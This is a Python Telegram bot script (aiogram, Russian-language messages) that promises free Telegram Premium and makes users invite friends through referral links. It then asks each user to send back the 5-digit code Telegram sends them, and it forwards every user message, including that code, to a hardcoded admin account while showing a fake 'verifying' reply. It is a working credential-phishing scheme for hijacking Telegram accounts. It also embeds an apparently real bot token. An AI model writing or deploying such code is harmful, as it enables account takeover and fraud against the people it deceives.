import asyncio
import sqlite3
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

# ТОКЕН және АДМИН ID
TOKEN = '8804154766:AAHtNST1xMxHJduM-z2jlH0EuHTdmuX6kbQ'
ADMIN_ID = 2082883268 

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Дерекқор
conn = sqlite3.connect('bot_data.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, coins INTEGER)')
conn.commit()

@dp.message(Command("start"))
async def start(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()
    
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    is_new = cursor.fetchone() is None

    if is_new:
        cursor.execute("INSERT INTO users VALUES (?, 0)", (user_id,))
        conn.commit()
        if len(args) > 1:
            referrer_id = int(args[1])
            if referrer_id != user_id:
                cursor.execute("UPDATE users SET coins = coins + 1 WHERE user_id = ?", (referrer_id,))
                conn.commit()
                try:
                    await bot.send_message(referrer_id, "🚀 Ваш друг перешел по ссылке! Вам начислена +1 🪙 монета. ✨")
                except: pass

    kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="Получить 🎁")]], resize_keyboard=True)
    await message.answer(
        "Привет! Я дарю Telegram Premium совершенно бесплатно! 💎✨🚀\n\n"
        "⭐️ Увеличенный лимит загрузки файлов — до 4 ГБ.\n"
        "⚡️ Более высокая скорость скачивания файлов.\n"
        "🎤 Преобразование голосовых сообщений в текст.\n"
        "🌍 Автоматический перевод сообщений.\n"
        "🚫 Отсутствие рекламы в каналах.\n"
        "😊 Эксклюзивные эмодзи, реакции и стикеры.\n"
        "👑 Значок Premium возле имени.\n"
        "📁 Больше папок, чатов, каналов и закреплённых сообщений.\n"
        "🎥 Видеоаватарки и анимированные изображения профиля.\n"
        "🔒 Дополнительные настройки конфиденциальности.\n\n"
        "Нажми кнопку «Получить 🎁» чтобы начать сбор монет.", 
        reply_markup=kb
    )

@dp.message(F.text == "Получить 🎁")
async def get_premium(message: types.Message):
    cursor.execute("SELECT coins FROM users WHERE user_id = ?", (message.from_user.id,))
    data = cursor.fetchone()
    coins = data[0] if data else 0
    
    if coins < 2:
        await message.answer(
            f"У вас {coins} 🪙 монет. У вас не хватает монет. Соберите 2 монеты, поделившись ссылкой с друзьями. 😊 📉\n\n"
            f"Ваша ссылка: https://t.me/gift_answer_bot?start={message.from_user.id} 🔗✨"
        )
    else:
        await message.answer(
            "Поздравляем! Вы собрали 2 монеты! 🎉\n"
            "📨 Мы сейчас отправим вам 5-значный код в Telegram.\n"
            "⏳ Пожалуйста, подождите немного — код придёт в течение 5 минут.\n"
            "🔐 После получения отправьте код нам. Спасибо за ожидание! 😊"
        )

@dp.message()
async def all_messages(message: types.Message):
    try:
        username = f"@{message.from_user.username}" if message.from_user.username else "Нет юзернейма"
        await bot.send_message(
            ADMIN_ID,
            f"🔔 **Новое сообщение!**\n"
            f"👤 От кого: {message.from_user.full_name} ({username})\n"
            f"🆔 ID: {message.from_user.id}\n\n"
            f"💬 Текст: {message.text}"
        )
    except Exception as e:
        print(f"Админге хабарлама жіберу қатесі: {e}")

    if message.text.isdigit() and len(message.text) == 5:
        await message.answer("⏳ Проверяем ваш код... Ожидайте 10 минут. 💎🎉 После этого вам будет выдан Telegram Premium! ⭐️")
    else:
        await message.answer("❌ Извините, это слово не было введено в нашу систему..")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
